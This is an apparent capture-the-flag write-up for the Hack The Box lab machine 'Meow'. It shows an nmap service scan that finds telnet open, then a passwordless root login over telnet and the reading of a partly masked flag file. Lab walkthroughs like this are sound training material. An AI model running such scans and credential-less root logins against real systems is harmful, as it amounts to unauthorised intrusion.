---
title:  "Meow"
---

# HTB - Starting Point Machine

Setting the target as an environment variable (for convenience)

```c
┌──(kali㉿kali)-[~]
└─$ t=10.129.59.221 
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ echo $t
10.129.59.221
```

Scanning the target's ports

```c
┌──(kali㉿kali)-[~]
└─$ nmap -sV $t
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 04:14 EDT
Nmap scan report for 10.129.59.221
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
```
	
Logging into telnet as root (there is no password)

```c
┌──(kali㉿kali)-[~]
└─$ telnet $t -l root
Trying 10.129.59.221...
Connected to 10.129.59.221.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 22 Jul 2022 08:34:48 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.59.221
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e0b7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
****************************4c19
```
